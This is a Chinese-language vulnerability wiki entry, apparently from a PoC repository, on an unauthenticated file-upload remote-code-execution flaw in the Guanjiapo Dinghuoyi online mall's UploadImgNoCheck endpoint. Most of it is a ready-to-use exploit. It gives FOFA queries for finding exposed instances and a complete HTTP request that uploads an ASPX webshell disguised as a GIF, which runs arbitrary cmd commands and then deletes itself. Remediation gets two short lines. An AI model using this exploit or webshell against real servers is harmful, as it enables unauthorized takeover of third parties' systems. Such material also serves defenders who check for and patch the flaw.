---
fofa: "title="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 管家婆订货易在线商城 UploadImgNoCheck 文件上传致RCE漏洞

# 漏洞描述

管家婆订货易在线商城 /api/Upload/UploadImgNoCheck 接口处存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

# 影响版本

管家婆订货易在线商城

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="订货易" || title="管家婆分销ERP" || body="管家婆分销ERP" || body="ERP V3"

POC/EXP：

POST /api/Upload/UploadImgNoCheck?m_server_name=ShopUserImg HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR

------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="Filedata";filename="rce.aspx"
Content-Type: image/jpeg

GIF89a
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
------WebKitFormBoundaryj7OlOPiiukkdktZR--

![image-20241127232918046](./.resource/管家婆订货易在线商城UploadImgNoCheck文件上传致RCE漏洞/media/image-20241127232918046.png)


![image-20241127233027771](./.resource/管家婆订货易在线商城UploadImgNoCheck文件上传致RCE漏洞/media/image-20241127233027771.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
